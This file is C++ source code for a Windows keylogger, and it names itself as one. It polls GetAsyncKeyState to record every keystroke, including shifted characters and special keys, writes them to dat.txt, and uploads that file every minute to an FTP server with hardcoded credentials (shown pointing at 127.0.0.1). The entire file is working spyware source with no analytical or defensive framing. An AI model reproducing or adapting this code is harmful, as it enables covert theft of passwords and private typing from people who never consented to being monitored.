#define _WIN32_WINNT 0x0600 // Define for Windows Vista and later
#include <Windows.h>
#include <wininet.h>
#include <iostream>
#include <fstream>
#include <sstream>
#include <thread>

#pragma comment(lib, "wininet.lib")

void LOG(const std::string& input) {
    std::ofstream LogFile("dat.txt", std::ios::app);
    if (LogFile.is_open()) {
        LogFile << input;
        LogFile.close();
    }
    else {
        std::cerr << "Failed to open log file" << std::endl;
    }
}

void DEBUG_LOG(const std::string& message) {
    std::ofstream debugLogFile("debug_log.txt", std::ios::app);
    if (debugLogFile.is_open()) {
        debugLogFile << message << std::endl;
        debugLogFile.close();
    }
    else {
        std::cerr << "Failed to open debug log file" << std::endl;
    }
}

bool SpecialKeys(int S_Key) {
    switch (S_Key) {
    case VK_SPACE:
        LOG(" ");
        return true;
    case VK_RETURN:
        LOG("\n");
        return true;
    case VK_BACK:
        LOG("[BACKSPACE]");
        return true;
    case VK_RBUTTON:
        LOG("[R_CLICK]");
        return true;
    case VK_CAPITAL:
        LOG("[CAPS_LOCK]");
        return true;
    case VK_TAB:
        LOG("[TAB]");
        return true;
    case VK_UP:
        LOG("[UP_ARROW]");
        return true;
    case VK_DOWN:
        LOG("[DOWN_ARROW]");
        return true;
    case VK_LEFT:
        LOG("[LEFT_ARROW]");
        return true;
    case VK_RIGHT:
        LOG("[RIGHT_ARROW]");
        return true;
    case VK_CONTROL:
        LOG("[CONTROL]");
        return true;
    case VK_MENU:
        LOG("[ALT]");
        return true;
    case VK_SHIFT:
    case VK_LSHIFT:
    case VK_RSHIFT:
        return true;  // Do nothing for shift keys
    default:
        return false;
    }
}

void logKeystroke(int key) {
    bool shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) || (GetAsyncKeyState(VK_LSHIFT) & 0x8000) || (GetAsyncKeyState(VK_RSHIFT) & 0x8000);
    bool capsLock = (GetKeyState(VK_CAPITAL) & 0x0001);

    if ((key >= 'A' && key <= 'Z') || (key >= 'a' && key <= 'z')) {
        if (shift ^ capsLock) {
            key = toupper(key);
        }
        else {
            key = tolower(key);
        }
    }
    else if (shift) {
        switch (key) {
        case '1': key = '!'; break;
        case '2': key = '@'; break;
        case '3': key = '#'; break;
        case '4': key = '$'; break;
        case '5': key = '%'; break;
        case '6': key = '^'; break;
        case '7': key = '&'; break;
        case '8': key = '*'; break;
        case '9': key = '('; break;
        case '0': key = ')'; break;
            // Add more cases as needed for other shifted characters
        default: break;
        }
    }

    // Log only printable characters
    if (key > 31 && key < 127) {
        LOG(std::string(1, char(key)));
    }
}

void uploadFileToFTP() {
    HINTERNET hInternet = InternetOpen(L"FTP Upload", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (hInternet) {
        HINTERNET hFtpSession = InternetConnect(hInternet, L"127.0.0.1", INTERNET_DEFAULT_FTP_PORT, L"user", L"12345", INTERNET_SERVICE_FTP, 0, 0);
        if (hFtpSession) {
            // Check if the file exists before attempting to upload
            std::ifstream infile("dat.txt");
            if (!infile.good()) {
                std::cerr << "File dat.txt does not exist. Make sure the file is created correctly." << std::endl;
                DEBUG_LOG("File dat.txt does not exist. Make sure the file is created correctly.");
                return;
            }

            BOOL result = FtpPutFile(hFtpSession, L"dat.txt", L"dat.txt", FTP_TRANSFER_TYPE_BINARY, 0);
            if (result) {
                std::cout << "File uploaded successfully." << std::endl;
                DEBUG_LOG("File uploaded successfully.");
            }
            else {
                std::cerr << "Failed to upload file. Error: " << GetLastError() << std::endl;
                DEBUG_LOG("Failed to upload file. Error: " + std::to_string(GetLastError()));
            }
            InternetCloseHandle(hFtpSession);
        }
        else {
            std::cerr << "Failed to connect to FTP server. Error: " << GetLastError() << std::endl;
            DEBUG_LOG("Failed to connect to FTP server. Error: " + std::to_string(GetLastError()));
        }
        InternetCloseHandle(hInternet);
    }
    else {
        std::cerr << "Failed to open internet. Error: " << GetLastError() << std::endl;
        DEBUG_LOG("Failed to open internet. Error: " + std::to_string(GetLastError()));
    }
}

int main() {
    // Show the console window for debugging
    // ShowWindow(GetConsoleWindow(), SW_SHOW);

    // Print a message to the console and debug log file
    std::cout << "Debugging: Starting the keylogger..." << std::endl;
    DEBUG_LOG("Debugging: Starting the keylogger...");

    std::thread keyloggerThread([]() {
        while (true) {
            Sleep(10);
            for (int KEY = 8; KEY <= 190; KEY++) {
                if (GetAsyncKeyState(KEY) == -32767) {
                    if (!SpecialKeys(KEY)) {
                        logKeystroke(KEY);
                        std::cout << "Key pressed: " << KEY << std::endl; // Debugging output
                        DEBUG_LOG("Key pressed: " + std::to_string(KEY));
                    }
                }
            }
        }
        });

    // Periodically send logs to FTP server every minute
    while (true) {
        std::cout << "Debugging: Uploading log file to FTP server..." << std::endl;
        DEBUG_LOG("Debugging: Uploading log file to FTP server...");
        uploadFileToFTP();
        Sleep(60000);  // Wait for 1 minute
    }

    keyloggerThread.join();
    return 0;
}
